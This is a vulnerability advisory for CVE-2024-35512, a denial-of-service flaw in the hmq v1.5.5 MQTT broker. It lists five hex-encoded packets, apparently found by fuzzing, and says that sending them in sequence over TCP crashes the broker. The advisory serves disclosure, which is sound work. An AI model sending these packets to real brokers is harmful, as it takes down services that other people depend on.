|  | [CVE ID] |
| --- | --- |
|  | CVE-2024-35512 |
|  | [Product] |
|  | hmq v1.5.5 |
|  | [Problem Type] |
|  | DoS |
|  | [Description] |
|  | An issue in hmq v1.5.5 allows attackers to cause a Denial of Service. |
|  | [Affected Component] |
|  | Directly causing the entire broker to collapse and unable to provide normal services |
|  | [Attack Vectors] |
|  | Firstly, based on the mqtt protocol and fuzz testing, randomly generate a specified data packet sequence: |
|  | packet 1: 101800044d51545404c2003c00000004746573740004746573748206000100012301200900000621000a220005d000 |
|  | packet 2: 102b00044d5154540500003c0822000a110000000f00166d7174746f6f6c732d38373936373631353230313239c000900300010070020001820b00010006245359532f23009003000102900400010000 |
|  | packet 3: 102200044d5154540402003c3116374d304b4b54615049377a347946474c4a656f6d5047c000a21700020600122f746573362f6d7174746f6f6c732f666f16c0009003000102 |
|  | packet 4: 102200044d5154540402003c3116374d304b4b54615049377a347946474c4a656f6d5047c000a21700020600122f746573362f6d7174746f6f6c732f666f16c0009003000102 |
|  | packet 5: 102200044d5154540402003c0016374d304b4b54615049377a347946474c4a656f6d5047c000a21700020000122f746573742f6d7174746f6f6c732f666f6fc0009003000102 |
|  | Secondly, based TCP/IP,the packets are sent to the hmq broker in sequence. |
|  | Finally, check the broker status and find that the broker crashed and disconnected. |
